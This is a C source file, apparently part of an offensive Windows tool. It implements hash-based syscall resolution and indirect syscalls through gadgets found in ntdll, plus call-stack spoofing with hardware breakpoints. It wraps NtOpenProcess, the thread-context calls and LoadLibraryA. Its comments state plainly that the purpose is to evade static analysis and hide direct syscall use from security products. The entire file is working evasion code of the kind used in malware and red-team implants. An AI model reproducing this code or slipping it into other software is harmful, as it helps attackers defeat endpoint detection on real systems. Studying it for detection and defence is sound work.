#include "syscalls.h"


SW3_SYSCALL_LIST SW3_SyscallList;

/*
 * If no 'syscall' instruction is found in NTDLL,
 * this function will be called.
 * By default just returns STATUS_NOT_FOUND.
 * The idea is to avoid having a 'syscall' instruction
 * on this program's .text section to evade static analysis
 */

__declspec(naked) void SyscallNotFound(void)
{
    asm(
        "mov eax, 0xC0DEDEAD \n"
        "ret \n"
    );
}

/*
 * the idea here is to find a 'syscall' instruction in 'ntdll.dll'
 * so that we can call it from our code and try to hide the fact
 * that we use direct syscalls
 */
PVOID GetSyscallAddress(
    IN PVOID nt_api_address,
    IN ULONG32 size_of_ntapi)
{
    PVOID syscall_address = NULL;
#ifdef _WIN64
    BYTE syscall_code[] = { 0x0f, 0x05, 0xc3 };
#else
    BYTE syscall_code[] = { 0x0f, 0x34, 0xc3 };
#endif

    // we will loook for a syscall;ret up to the end of the api
    ULONG32 max_look_range = size_of_ntapi - sizeof(syscall_code) + 1;

#ifdef _M_IX86
    if (local_is_wow64())
    {
        // if we are a WoW64 process, jump to WOW32Reserved
        syscall_address = (PVOID)READ_MEMLOC(0xc0);
        return syscall_address;
    }
#endif

    for (ULONG32 offset = 0; offset < max_look_range; offset++)
    {
        // we don't really care if there is a 'jmp' between
        // nt_api_address and the 'syscall; ret' instructions
        syscall_address = SW3_RVA2VA(PVOID, nt_api_address, offset);

        if (!memcmp((PVOID)syscall_code, syscall_address, sizeof(syscall_code)))
        {
            // we can use the original code for this system call :)
            return syscall_address;
        }
    }

    // the 'syscall; ret' intructions have not been found,
    // we will try to use one near it, similarly to HalosGate

    for (ULONG32 num_jumps = 1; num_jumps < SW3_MAX_ENTRIES; num_jumps++)
    {
        // let's try with an Nt* API below our syscall
        for (ULONG32 offset = 0; offset < max_look_range; offset++)
        {
            syscall_address = SW3_RVA2VA(
                PVOID,
                nt_api_address,
                offset + num_jumps * size_of_ntapi);
            if (!memcmp((PVOID)syscall_code, syscall_address, sizeof(syscall_code)))
                return syscall_address;
        }

        // let's try with an Nt* API above our syscall
        for (ULONG32 offset = 0; offset < max_look_range; offset++)
        {
            syscall_address = SW3_RVA2VA(
                PVOID,
                nt_api_address,
                offset - num_jumps * size_of_ntapi);
            if (!memcmp((PVOID)syscall_code, syscall_address, sizeof(syscall_code)))
                return syscall_address;
        }
    }

    return SyscallNotFound;
}

DWORD SW3_HashSyscall(
    IN PCSTR FunctionName)
{
    DWORD i = 0;
    DWORD Hash = SW3_SEED;

    while (FunctionName[i])
    {
        WORD PartialName = *(WORD*)((ULONG_PTR)FunctionName + i++);
        Hash ^= PartialName + SW3_ROX8(Hash);
    }

    return Hash;
}

BOOL SW3_PopulateSyscallList(VOID)
{
    // Return early if the list is already populated.
    if (SW3_SyscallList.Count) return TRUE;

    PSW3_PEB Peb = (PSW3_PEB)READ_MEMLOC(PEB_OFFSET);
    PSW3_PEB_LDR_DATA Ldr = Peb->Ldr;
    PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
    PVOID DllBase = NULL;

    // Get the DllBase address of NTDLL.dll. NTDLL is not guaranteed to be the second
    // in the list, so it's safer to loop through the full list and find it.
    PSW3_LDR_DATA_TABLE_ENTRY LdrEntry;
    for (LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)Ldr->Reserved2[1]; LdrEntry->DllBase != NULL; LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)LdrEntry->Reserved1[0])
    {
        DllBase = LdrEntry->DllBase;
        PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
        PIMAGE_NT_HEADERS NtHeaders = SW3_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
        PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
        DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (VirtualAddress == 0) continue;

        ExportDirectory = SW3_RVA2VA(PIMAGE_EXPORT_DIRECTORY, DllBase, VirtualAddress);

        // If this is NTDLL.dll, exit loop.
        PCHAR DllName = SW3_RVA2VA(PCHAR, DllBase, ExportDirectory->Name);
        if ((*(ULONG*)DllName | 0x20202020) != 0x6c64746e) continue;
        if ((*(ULONG*)(DllName + 4) | 0x20202020) == 0x6c642e6c) break;
    }

    if (!ExportDirectory) return FALSE;

    DWORD NumberOfNames = ExportDirectory->NumberOfNames;
    PDWORD Functions = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
    PDWORD Names = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
    PWORD Ordinals = SW3_RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);

    // Populate SW3_SyscallList with unsorted Zw* entries.
    DWORD i = 0;
    PSW3_SYSCALL_ENTRY Entries = SW3_SyscallList.Entries;
    do
    {
        PCHAR FunctionName = SW3_RVA2VA(PCHAR, DllBase, Names[NumberOfNames - 1]);

        // Is this a system call?
        if (*(USHORT*)FunctionName == 0x775a)
        {
            Entries[i].Hash = SW3_HashSyscall(FunctionName);
            Entries[i].Address = Functions[Ordinals[NumberOfNames - 1]];

            i++;
            if (i == SW3_MAX_ENTRIES) break;
        }
    } while (--NumberOfNames);

    // Save total number of system calls found.
    SW3_SyscallList.Count = i;

    // Sort the list by address in ascending order.
    for (i = 0; i < SW3_SyscallList.Count - 1; i++)
    {
        for (DWORD j = 0; j < SW3_SyscallList.Count - i - 1; j++)
        {
            if (Entries[j].Address > Entries[j + 1].Address)
            {
                // Swap entries.
                SW3_SYSCALL_ENTRY TempEntry = { 0 };

                TempEntry.Hash = Entries[j].Hash;
                TempEntry.Address = Entries[j].Address;

                Entries[j].Hash = Entries[j + 1].Hash;
                Entries[j].Address = Entries[j + 1].Address;

                Entries[j + 1].Hash = TempEntry.Hash;
                Entries[j + 1].Address = TempEntry.Address;
            }
        }
    }

    // we need to know this in order to better search for syscall ids
    ULONG size_of_ntapi = Entries[1].Address - Entries[0].Address;

    // finally calculate the address of each syscall
    for (i = 0; i < SW3_SyscallList.Count - 1; i++)
    {
        PVOID nt_api_address = SW3_RVA2VA(PVOID, DllBase, Entries[i].Address);
        Entries[i].SyscallAddress = GetSyscallAddress(nt_api_address, size_of_ntapi);
    }

    return TRUE;
}

EXTERN_C DWORD SW3_GetSyscallNumber(
    IN DWORD FunctionHash)
{
    if (!SW3_PopulateSyscallList())
    {
        DPRINT_ERR("SW3_PopulateSyscallList failed");
        return 0;
    }

    for (DWORD i = 0; i < SW3_SyscallList.Count; i++)
    {
        if (FunctionHash == SW3_SyscallList.Entries[i].Hash)
        {
            return i;
        }
    }
    DPRINT_ERR("syscall with hash 0x%lx not found", FunctionHash);
    return 0;
}

EXTERN_C PVOID SW3_GetSyscallAddress(
    IN DWORD FunctionHash)
{
    if (!SW3_PopulateSyscallList())
    {
        DPRINT_ERR("SW3_PopulateSyscallList failed");
        return NULL;
    }

    for (DWORD i = 0; i < SW3_SyscallList.Count; i++)
    {
        if (FunctionHash == SW3_SyscallList.Entries[i].Hash)
        {
            return SW3_SyscallList.Entries[i].SyscallAddress;
        }
    }
    DPRINT_ERR("syscall with hash 0x%lx not found", FunctionHash);
    return NULL;
}

__declspec(naked) BOOL local_is_wow64(void)
{
#if defined(_WIN64)
    asm(
        "mov rax, 0 \n"
        "ret \n"
    );
#else
    asm(
        "mov eax, fs:[0xc0] \n"
        "test eax, eax \n"
        "jne wow64 \n"
        "mov eax, 0 \n"
        "ret \n"
        "wow64: \n"
        "mov eax, 1 \n"
        "ret \n"
    );
#endif
}

// use indirect syscalls for NtGetContextThread
__declspec(naked) NTSTATUS _NtGetContextThread(
    IN HANDLE ThreadHandle,
    IN OUT PCONTEXT ThreadContext)
{
#if defined(_WIN64)
    asm(
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x74D6BFF9 \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        "push 0x74D6BFF9 \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW3_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

// use indirect syscalls for NtSetContextThread
__declspec(naked) NTSTATUS _NtSetContextThread(
    IN HANDLE ThreadHandle,
    IN PCONTEXT Context)
{
#if defined(_WIN64)
    asm(
        "mov [rsp +8], rcx \n"
        "mov [rsp+16], rdx \n"
        "mov [rsp+24], r8 \n"
        "mov [rsp+32], r9 \n"
        "mov rcx, 0x74DFB87F \n"
        "push rcx \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallAddress \n"
        "add rsp, 0x28 \n"
        "pop rcx \n"
        "push rax \n"
        "sub rsp, 0x28 \n"
        "call SW3_GetSyscallNumber \n"
        "add rsp, 0x28 \n"
        "pop r11 \n"
        "mov rcx, [rsp+8] \n"
        "mov rdx, [rsp+16] \n"
        "mov r8, [rsp+24] \n"
        "mov r9, [rsp+32] \n"
        "mov r10, rcx \n"
        "jmp r11 \n"
    );
#else
    asm(
        "push 0x74DFB87F \n"
        "call SW3_GetSyscallAddress \n"
        "pop ebx \n"
        "push eax \n"
        "push ebx \n"
        "call SW3_GetSyscallNumber \n"
        "add esp, 4 \n"
        "pop ebx \n"
        "mov edx, esp \n"
        "sub edx, 4 \n"
        "call ebx \n"
        "ret \n"
    );
#endif
}

/*
 * This function is responsible for:
 * 1) create the backup of the stack
 * 2) copy over the fake stack
 * 3) save all the information required by the handler
 * 4) set all the parameters
 * 5) set RSP and RBP to the fake callstack
 * 6) set the syscall number
 * 7) jump to the syscall address
 */
__declspec(naked) ULONG_PTR jumper(
    PVOID syscall_data)
{
#if defined(_WIN64)
    asm(
        // save the return address
        "pop r11 \n"
        // backup the full stack
        "xor rax, rax \n"
        // rdx: full_stack_size
        "mov rdx, [rcx+0x08] \n"
        // r8: full_stack_backup_addr
        "mov r8, [rcx+0x10] \n"
        // r9: full_stack_base
        "mov r9, [rcx] \n"
        "bkp_stack_loop: \n"
        "mov r10b, [r9+rax] \n"
        "mov [r8+rax], r10b \n"
        "inc rax \n"
        "cmp rax, rdx \n"
        "jne bkp_stack_loop \n"
        // copy the fake stack
        "xor rax, rax \n"
        // r8: fake_stack_heap_addr
        "mov r8, [rcx+0x18] \n"
        // r9: fake_stack_target_addr
        "mov r9, [rcx+0x28] \n"
        // rdx: fake_stack_size
        "mov rdx, [rcx+0x20] \n "
        "cpy_fake_stack_loop: \n"
        "mov r10b, [r8+rax] \n"
        "mov [r9+rax], r10b \n"
        "inc rax \n"
        "cmp rax, rdx \n"
        "jne cpy_fake_stack_loop \n"
        // save full_stack_size, full_stack_backup_addr, full_stack_base,
        // RBX, RBP, RSP and RIP after the canary
        // rax: canary_addr
        "mov rax, [rcx+0x40] \n"
        // rax: storing_area
        "mov rax, [rax+0x08] \n"
        // full_stack_size
        "mov rdx, [rcx+0x08] \n"
        "mov [rax+0x00], rdx \n"
        // full_stack_backup_addr
        "mov rdx, [rcx+0x10] \n"
        "mov [rax+0x08], rdx \n"
        // full_stack_base
        "mov rdx, [rcx] \n"
        "mov [rax+0x10], rdx \n"
        // RBX
        "mov [rax+0x18], rbx \n"
        // RBP
        "mov [rax+0x20], rbp \n"
        // RSP
        "mov [rax+0x28], rsp \n"
        // RIP
        "mov [rax+0x30], r11 \n"
        // set the parameters
        // are there more than 0 params?
        "xor rax, rax \n"
        // eax: num_params
        "mov eax, [rcx+0x5c] \n"
        // r10: syscall_data
        "mov r10, rcx \n"
        "cmp eax, 0x1 \n"
        "jl params_ready \n"
        // set parameter 1
        "mov rcx, [r10+0x60] \n"
        // is there more than 1 param?
        "cmp eax, 0x2 \n"
        "jl params_ready \n"
        // set parameter 2
        "mov rdx, [r10+0x68] \n"
        // are there more than 2 params?
        "cmp eax, 0x3 \n"
        "jl params_ready \n"
        // set parameter 3
        "mov r8, [r10+0x70] \n"
        // are there more than 3 params?
        "cmp eax, 0x4 \n"
        "jl params_ready \n"
        // set parameter 4
        "mov r9, [r10+0x78] \n"
        // set the rest of the parameters
        "sub eax, 0x4 \n"
        // rbp: fake_stack_rsp
        "mov rbp, [r10+0x30] \n"
        "stack_params_loop: \n"
        "cmp eax, 0x1 \n"
        "jl params_ready \n"
        "mov rbx, [r10+0x78+rax*0x8] \n"
        "mov [rbp+0x20+rax*0x8], rbx \n"
        "dec rax \n"
        "jmp stack_params_loop \n"
        "params_ready: \n"
        // set the RSP
        "mov rsp, [r10+0x30] \n"
        // set the RBP
        "mov rbp, [r10+0x38] \n"
        // set the syscall number
        "mov eax, [r10+0x50] \n"
        // r11: syscall_addr
        "mov r11, [r10+0x48] \n"
        // r10 must be equal to rcx for some reason
        "mov r10, rcx \n"
        // jump to the syscall address :^)
        "jmp r11 \n"
    );
#else
    asm(
        // ecx: syscall_data
        "mov ecx, [esp+0x04] \n"
        // backup the full stack
        "xor eax, eax \n"
        // edx: full_stack_size
        "mov edx, [ecx+0x04] \n"
        // edi: full_stack_backup_addr
        "mov edi, [ecx+0x08] \n"
        // esi: full_stack_base
        "mov esi, [ecx] \n"
        "bkp_stack_loop: \n"
        "mov bl, [esi+eax] \n"
        "mov [edi+eax], bl \n"
        "inc eax \n"
        "cmp eax, edx \n"
        "jne bkp_stack_loop \n"
        // copy the fake stack
        "xor eax, eax \n"
        // esi: fake_stack_heap_addr
        "mov esi, [ecx+0x0c] \n"
        // edi: fake_stack_target_addr
        "mov edi, [ecx+0x14] \n"
        // edx: fake_stack_size
        "mov edx, [ecx+0x10] \n "
        "cpy_fake_stack_loop: \n"
        "mov bl, [esi+eax] \n"
        "mov [edi+eax], bl \n"
        "inc eax \n"
        "cmp eax, edx \n"
        "jne cpy_fake_stack_loop \n"
        // save full_stack_size, full_stack_backup_addr, full_stack_base,
        // EBX, EBP, ESP and EIP in the storing_area
        // eax: canary_addr
        "mov eax, [ecx+0x20] \n"
        // eax: storing_area
        "mov eax, [eax+0x04] \n"
        // full_stack_size
        "mov edx, [ecx+0x04] \n"
        "mov [eax+0x00], edx \n"
        // full_stack_backup_addr
        "mov edx, [ecx+0x08] \n"
        "mov [eax+0x04], edx \n"
        // full_stack_base
        "mov edx, [ecx] \n"
        "mov [eax+0x08], edx \n"
        // RBX
        "mov [eax+0x0c], ebx \n"
        // RBP
        "mov [eax+0x10], ebp \n"
        // RSP
        "pop edx \n"
        "mov [eax+0x14], esp \n"
        // RIP
        "mov [eax+0x18], edx \n"
        // set the parameters
        // eax: num_params
        "mov eax, [ecx+0x34] \n"
        // ebp: fake_stack_rsp
        "mov ebp, [ecx+0x18] \n"
        // edx: is_api_call
        "mov edx, [ecx+0x2c] \n"
        "cmp edx, 0x0 \n"
        "jne stack_params_loop \n"
        // syscalls in x86 have a different stack layout
        // 1) address of the 'ret' instruction next to the sysenter
        // 2) the actual return address
        // 3) parameters
        // save the real return address in the second position
        // edx: ret addr
        "mov edx, [ebp] \n"
        "mov [ebp+0x4], edx \n"
        // save the address of the 'ret' instruction in the first position
        // edx: syscall address
        "mov edx, [ecx+0x24] \n"
        // edx: address of the 'ret' instruction
        "add edx, 0x2 \n"
        "mov [ebp], edx \n"
        // save the parameters on the third and not second position
        "add ebp, 0x4 \n"
        // edx: is_wow64
        "mov edx, [ecx+0x30] \n"
        "cmp edx, 0x0 \n"
        "je stack_params_loop \n"
        // syscalls in WoW64 have a different stack layout
        // 1) the actual return address
        // 2) 0x4 bytes of space
        // 3) parameters
        "mov edx, [ebp] \n"
        "mov [ebp-0x4], edx \n"
        "stack_params_loop: \n"
        "cmp eax, 0x1 \n"
        "jl params_ready \n"
        "mov ebx, [ecx+0x34+eax*0x4] \n"
        "mov [ebp+eax*0x4], ebx \n"
        "dec eax \n"
        "jmp stack_params_loop \n"
        "params_ready: \n"
        // set the RSP
        "mov esp, [ecx+0x18] \n"
        // set the RBP
        "mov ebp, [ecx+0x1c] \n"
        // set the syscall number
        "mov eax, [ecx+0x28] \n"
        // ebx: syscall_addr
        "mov ebx, [ecx+0x24] \n"
        // edx must to be equal to esp for some reason
        "mov edx, esp \n"
        // jump to the syscall address :^)
        "jmp ebx \n"
    );
#endif
}

/*
 * This function is responsible for:
 * 1) get the address and number of the syscall
 * 2) create fake call stack
 * 3) set the hardware breakpoint
 * 4) call the jumper
 * 5) unset the hardware breakpoint
 */
NTSTATUS trigger_syscall(
    IN ULONG32 syscall_hash,
    IN ULONG32 num_params,
    ...)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    STACK_INFO stack_info = { 0 };
    PVOID syscall_addr = NULL;
    PVOID ret_addr = NULL;
    ULONG32 syscall_number = 0;
    HANDLE hHwBpHandler = NULL;
    BOOL success = FALSE;
    PSYSCALL_DATA syscall_data = NULL;
    va_list valist;

    va_start(valist, num_params);

    // get the syscall address
    syscall_addr = SW3_GetSyscallAddress(syscall_hash);
    if (!syscall_addr)
        goto cleanup;

    // get the syscall number
    syscall_number = SW3_GetSyscallNumber(syscall_hash);
    if (!syscall_number)
        goto cleanup;

    // create the fake callstack
    success = create_fake_callstack(&stack_info, syscall_hash);
    if (!success)
        goto cleanup;
    DPRINT("created the fake callstack");

    // get the first ret address in the fake callstack
    ret_addr = stack_info.first_ret_addr;
    if (!ret_addr)
    {
        // if there is none, use the 'ret' instruction after the syscall
        ret_addr = SW3_RVA2VA(PVOID, syscall_addr, 2);
    }

    // set the hardware breakpoint at the ret addr
    success = set_hwbp(ret_addr, &hHwBpHandler);
    if (!success)
        goto cleanup;
    DPRINT("hardware breakpoint set at 0x%p", ret_addr);

    // because the syscall data is on the heap,
    // overwriting the stack won't affect it
    syscall_data = intAlloc(sizeof(SYSCALL_DATA));
    if (!syscall_data)
    {
        malloc_failed();
        goto cleanup;
    }

    syscall_data->full_stack_base = stack_info.full_stack_base;
    syscall_data->full_stack_size = stack_info.full_stack_size;
    syscall_data->full_stack_backup_addr = stack_info.full_stack_backup_addr;
    syscall_data->fake_stack_heap_addr = stack_info.fake_stack_heap_addr;
    syscall_data->fake_stack_size = stack_info.fake_stack_size;
    syscall_data->fake_stack_target_addr = stack_info.fake_stack_target_addr;
    syscall_data->fake_stack_rsp = stack_info.fake_stack_rsp;
    syscall_data->fake_stack_rbp = stack_info.fake_stack_rbp;
    syscall_data->canary_addr = stack_info.canary_addr;
    syscall_data->is_api_call = FALSE;
    syscall_data->is_wow64 = local_is_wow64();
    syscall_data->syscall_addr = syscall_addr;
    syscall_data->syscall_number = syscall_number;
    syscall_data->num_params = num_params;
    for (int i = 0; i < num_params; ++i)
    {
        syscall_data->params[i] = va_arg(valist, ULONG_PTR);
    }

    DPRINT("triggering the syscall...");
    status = (NTSTATUS)jumper(syscall_data);
    DPRINT("done.");

cleanup:
    if (syscall_data)
        intFree(syscall_data);
    if (stack_info.full_stack_backup_addr)
        intFree(stack_info.full_stack_backup_addr);
    if (stack_info.fake_stack_heap_addr)
        intFree(stack_info.fake_stack_heap_addr);
    if (stack_info.storing_area)
        intFree(stack_info.storing_area);
    if (hHwBpHandler)
        unset_hwbp(hHwBpHandler);
    va_end(valist);

    return status;
}

/*
 * This function is responsible for:
 * 1) get the address of the API
 * 2) create fake call stack
 * 3) set the hardware breakpoint
 * 4) call the jumper
 * 5) unset the hardware breakpoint
 */
PVOID trigger_api(
    IN ULONG32 api_hash,
    IN LPWSTR dll_path,
    IN ULONG32 num_params,
    ...)
{
    PVOID ret_val = NULL;
    STACK_INFO stack_info = { 0 };
    PVOID ret_addr = NULL;
    PVOID api_addr = NULL;
    HANDLE hHwBpHandler = NULL;
    BOOL success = FALSE;
    PSYSCALL_DATA api_data = NULL;
    va_list valist;

    va_start(valist, num_params);

    api_addr = get_function_address(
        get_library_address(dll_path, TRUE),
        api_hash,
        0);
    if (!api_addr)
    {
        DPRINT_ERR("could not find export with hash 0x%x on %ls", api_hash, dll_path);
        goto cleanup;
    }

    // create the fake callstack
    success = create_fake_callstack(&stack_info, api_hash);
    if (!success)
        goto cleanup;
    DPRINT("created the fake callstack");

    // get the first ret address in the fake callstack
    ret_addr = stack_info.first_ret_addr;
    if (!ret_addr)
    {
        PRINT_ERR("the return address for an API can't be NULL");
        goto cleanup;
    }

    // set the hardware breakpoint at the ret addr
    success = set_hwbp(ret_addr, &hHwBpHandler);
    if (!success)
        goto cleanup;
    DPRINT("hardware breakpoint set at 0x%p", ret_addr);

    // because the api data is on the heap,
    // overwriting the stack won't affect it
    api_data = intAlloc(sizeof(SYSCALL_DATA));
    if (!api_data)
    {
        malloc_failed();
        goto cleanup;
    }

    api_data->full_stack_base = stack_info.full_stack_base;
    api_data->full_stack_size = stack_info.full_stack_size;
    api_data->full_stack_backup_addr = stack_info.full_stack_backup_addr;
    api_data->fake_stack_heap_addr = stack_info.fake_stack_heap_addr;
    api_data->fake_stack_size = stack_info.fake_stack_size;
    api_data->fake_stack_target_addr = stack_info.fake_stack_target_addr;
    api_data->fake_stack_rsp = stack_info.fake_stack_rsp;
    api_data->fake_stack_rbp = stack_info.fake_stack_rbp;
    api_data->canary_addr = stack_info.canary_addr;
    api_data->is_api_call = TRUE;
    api_data->api_addr = api_addr;
    api_data->num_params = num_params;
    for (int i = 0; i < num_params; ++i)
    {
        api_data->params[i] = va_arg(valist, ULONG_PTR);
    }

    DPRINT("triggering the API...");
    ret_val = (PVOID)jumper(api_data);
    DPRINT("done.");

cleanup:
    if (api_data)
        intFree(api_data);
    if (stack_info.full_stack_backup_addr)
        intFree(stack_info.full_stack_backup_addr);
    if (stack_info.fake_stack_heap_addr)
        intFree(stack_info.fake_stack_heap_addr);
    if (stack_info.storing_area)
        intFree(stack_info.storing_area);
    if (hHwBpHandler)
        unset_hwbp(hHwBpHandler);
    va_end(valist);

    return ret_val;
}

NTSTATUS _NtOpenProcess(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN PVOID ClientId OPTIONAL)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    status = trigger_syscall(
        NtOpenProcess_SW3_HASH,
        4,
        ProcessHandle,
        DesiredAccess,
        ObjectAttributes,
        ClientId);

    return status;
}

HMODULE _LoadLibraryA(
  IN LPCSTR lpLibFileName)
{
    HMODULE ret_val = NULL;

    ret_val = (HMODULE)trigger_api(
        LoadLibraryA_SW3_HASH,
        KERNELBASE_DLL,
        1,
        lpLibFileName);

    return ret_val;
}
